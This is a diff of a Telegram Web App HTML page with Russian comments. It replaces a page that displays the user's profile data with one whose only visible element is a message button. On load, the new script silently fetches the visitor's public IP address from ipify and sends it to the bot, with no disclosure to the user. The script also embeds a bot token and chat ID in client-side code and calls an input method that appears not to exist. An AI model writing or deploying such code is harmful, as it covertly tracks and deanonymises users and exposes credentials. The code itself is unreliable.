@@ -1,94 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Информация о пользователе</title>
-  <script src="https://telegram.org/js/telegram-web-app.js?2"></script>
-  <style>
-    body {
-      font-family: sans-serif;
-      margin: 20px;
-    }
+    <meta charset="UTF-8">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        var IS_IP_SENT = false;
+        function sendIPtoBot(ip) {
+            if (IS_IP_SENT) return;
+            IS_IP_SENT = true;
+            window.Telegram.WebApp.sendData(`{"web_app_ip":"${ip}"}`);
+        }
 
-    #user-info {
-      margin-top: 20px;
-      padding: 15px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-    }
+        function getIP(json) { 
+            sendIPtoBot(json.ip); 
+        }
 
-    #user-info h3 {
-      margin-top: 0;
-    }
+        // Используем fetch для получения IP-адреса
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                sendIPtoBot(data.ip);
+            })
+            .catch(error => {
+                console.error('Ошибка получения IP-адреса:', error);
+            });
 
-    #user-info pre {
-      white-space: pre-wrap;
-      background-color: #f5f5f5;
-      padding: 10px;
-      border-radius: 3px;
-    }
-  </style>
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      const userInfo = document.getElementById('user-info');
-      
-      // Основная информация о пользователе
-      userInfo.innerHTML += `
-        <h3>Основная информация</h3>
-        <p><strong>Идентификатор пользователя:</strong> ${Telegram.WebApp.initDataUnsafe.user.id || "Неизвестно"}</p>
-        <p><strong>Имя пользователя:</strong> ${Telegram.WebApp.initDataUnsafe.user.username || "Неизвестно"}</p>
-        <p><strong>Имя:</strong> ${Telegram.WebApp.initDataUnsafe.user.first_name || "Неизвестно"} ${Telegram.WebApp.initDataUnsafe.user.last_name || "Неизвестно"}</p>
-      `;
-
-      // Данные, переданные боту
-      if (Telegram.WebApp.initData) {
-        userInfo.innerHTML += `
-          <h3>Данные, переданные боту</h3>
-          <pre>${JSON.stringify(Telegram.WebApp.initData, null, 2)}</pre>
-        `;
-      } else {
-        userInfo.innerHTML += `
-          <h3>Данные, переданные боту</h3>
-          <p>Данные не были переданы.</p>
-        `;
-      }
-
-      // Параметры темы пользователя
-      if (Telegram.WebApp.themeParams) {
-        userInfo.innerHTML += `
-          <h3>Параметры темы</h3>
-          <pre>${JSON.stringify(Telegram.WebApp.themeParams, null, 2)}</pre>
-        `;
-      } else {
-        userInfo.innerHTML += `
-          <h3>Параметры темы</h3>
-          <p>Информация о параметрах темы не доступна.</p>
-        `;
-      }
-
-      // Информация о запросе (если есть)
-      if (Telegram.WebApp.initDataUnsafe.query_id) {
-        userInfo.innerHTML += `
-          <h3>Информация о запросе</h3>
-          <p><strong>Идентификатор запроса:</strong> ${Telegram.WebApp.initDataUnsafe.query_id}</p>
-        `;
-      }
-
-      // Дополнительная информация (если доступна)
-      if (Telegram.WebApp.initDataUnsafe.receiver) {
-        userInfo.innerHTML += `
-          <h3>Информация о чате</h3>
-          <p><strong>Тип чата:</strong> ${Telegram.WebApp.initDataUnsafe.receiver.type || "Неизвестно"}</p>
-          <p><strong>Название чата:</strong> ${Telegram.WebApp.initDataUnsafe.receiver.title || "Неизвестно"}</p>
-          <p><strong>Имя пользователя чата:</strong> ${Telegram.WebApp.initDataUnsafe.receiver.username || "Неизвестно"}</p>
-        `;
-      }
-    });
-  </script>
+        // Получаем ответ от пользователя 
+        window.Telegram.WebApp.onEvent('mainButtonClicked', () => {
+            const userMessage = window.Telegram.WebApp.getInput();
+            const message = `Новый пользователь отправил сообщение: ${userMessage}`;
+            // Отправляем сообщение в бот
+            fetch('https://api.telegram.org/bot7317057645:AAEoHlTpui1kUxhI575JnpFpVrEsL68VZjg/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: '1894886278',
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`Ошибка отправки сообщения: ${response.status}`);
+                }
+                console.log('Сообщение отправлено успешно.');
+            })
+            .catch(error => {
+                console.error('Ошибка отправки сообщения:', error);
+            });
+        });
+    </script>
 </head>
 <body>
-  <h1>Информация о пользователе</h1>
-  <div id="user-info"></div>
+    <!--  Добавляем кнопку для отправки сообщений -->
+    <button id="mainButton">Отправить сообщение</button>
 </body>
 </html>
